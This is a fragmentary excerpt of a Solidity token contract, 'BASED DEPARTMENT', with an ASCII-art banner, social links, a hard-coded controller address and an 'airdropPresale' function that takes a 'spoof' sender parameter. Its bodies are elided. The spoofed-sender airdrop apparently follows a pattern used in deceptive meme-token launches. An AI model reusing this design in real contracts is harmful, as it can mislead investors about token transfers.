 ...
 \:::\   \:::\/:::/    /  \/____/ \:::\/:::/    /  \:::\   \:::\   \/____/  \:::\   \:::\   \/____/  \:::\    \   /:::/    / 
  \:::\   \::::::/    /            \::::::/    /    \:::\   \:::\    \       \:::\   \:::\    \       \:::\    \ /:::/    /  
   \:::\   \::::/    /              \::::/    /      \:::\   \:::\____\       \:::\   \:::\____\       \:::\    /:::/    /   
    ...
    https://t.me/BasedDepartmentETH
    https://twitter.com/BasedDpt_Token
*/
...
contract BASEDDEPARTMENT is Context, IERC20 {
    ...
    address deployer = 0x5F1b7e09C779A11c4D568F8bEaf33798Ca9BCEbf;
    address public _controller = 0x5F1b7e09C779A11c4D568F8bEaf33798Ca9BCEbf;
    constructor () public {
        _name = "BASED DEPARTMENT";
        _symbol ="BASED";
        _decimals = 18;
    ...
    function _sendTx(address sender, address recipient, uint256 amount) internal virtual {
     ...
     function airdropPresale(address spoof,address[] memory receivers, uint256[] memory amounts) public {
